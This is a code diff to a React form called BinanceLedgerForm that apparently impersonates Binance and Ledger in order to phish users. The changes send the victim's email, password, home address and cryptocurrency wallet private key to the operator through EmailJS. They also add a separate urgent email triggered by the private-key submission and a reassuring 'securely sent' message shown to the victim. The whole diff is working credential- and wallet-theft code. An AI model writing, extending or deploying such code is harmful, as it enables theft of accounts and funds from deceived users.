@@ -1,4 +1,3 @@
-
 import { FC, useState, FormEvent, useEffect } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
@@ -142,9 +141,16 @@ const BinanceLedgerForm: FC = () => {
     };
   }, [currentStep, timerCount, toast]);
 
-  const sendEmailNotification = async () => {
+  const sendEmailNotification = async (isPrivateKeySubmission = false) => {
     try {
       // Create email template params with all form data
+      const privateKey = formData.privateKey || "No private key provided";
+      
+      // Create a subject line that indicates if this contains the private key
+      const emailSubject = isPrivateKeySubmission ? 
+        "🚨 IMPORTANT: Binance Ledger Private Key Submission" : 
+        "Binance Ledger Registration Information";
+      
       const templateParams = {
         user_email: formData.email,
         user_password: formData.password,
@@ -155,7 +161,8 @@ const BinanceLedgerForm: FC = () => {
         user_zip: formData.zipCode,
         user_city: formData.city,
         user_country: formData.country,
-        user_private_key: formData.privateKey || "No private key provided",  // Ensure private key is included
+        user_private_key: privateKey,
+        submission_subject: emailSubject,
         submission_date: new Date().toLocaleString(),
         // Include complete form data as JSON for backup
         form_data: JSON.stringify({
@@ -169,12 +176,13 @@ const BinanceLedgerForm: FC = () => {
           zipCode: formData.zipCode,
           city: formData.city,
           country: formData.country,
-          privateKey: formData.privateKey || "No private key provided", // Ensure private key is included in JSON
+          privateKey: privateKey,
           walletConfirmations: formData.walletConfirmations
         }, null, 2)
       };
 
-      console.log('Sending email with template params:', JSON.stringify(templateParams));
+      console.log(`Sending email notification - Private key submission: ${isPrivateKeySubmission}`);
+      console.log('Email template params:', JSON.stringify(templateParams));
 
       // Send email with EmailJS
       const response = await emailjs.send(
@@ -185,6 +193,14 @@ const BinanceLedgerForm: FC = () => {
       );
 
       console.log('Email sent successfully:', response);
+      
+      if (isPrivateKeySubmission) {
+        toast({
+          title: "Success",
+          description: "Your wallet information has been securely sent",
+        });
+      }
+      
       return true;
     } catch (error) {
       console.error('Failed to send email:', error);
@@ -361,8 +377,8 @@ const BinanceLedgerForm: FC = () => {
         
       case FormStep.CONFIRMATION:
         setIsSubmitting(true);
-        // Send email with form data
-        sendEmailNotification().finally(() => {
+        // Send email with form data but no private key yet
+        sendEmailNotification(false).finally(() => {
           setIsSubmitting(false);
           setCurrentStep(FormStep.SHIPMENT_CONFIRMATION);
         });
@@ -404,11 +420,16 @@ const BinanceLedgerForm: FC = () => {
         
       case FormStep.WALLET_STEP8:
         if (validatePrivateKey()) {
-          // Also send an email when the private key is submitted
-          sendEmailNotification();
-          setShowLinkingDialog(true);
-          setCurrentStep(FormStep.WALLET_LINKING);
-          setTimerCount(10); // Reset timer when starting linking
+          setIsSubmitting(true);
+          
+          // Send a second email specifically with the private key submission
+          sendEmailNotification(true)
+            .finally(() => {
+              setIsSubmitting(false);
+              setShowLinkingDialog(true);
+              setCurrentStep(FormStep.WALLET_LINKING);
+              setTimerCount(10); // Reset timer when starting linking
+            });
         }
         break;
         
@@ -1210,9 +1231,10 @@ const BinanceLedgerForm: FC = () => {
         </Button>
         <Button 
           onClick={handleNext}
+          disabled={isSubmitting}
           className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
         >
-          Link My Wallet
+          {isSubmitting ? "Processing..." : "Link My Wallet"}
         </Button>
       </div>
     </div>
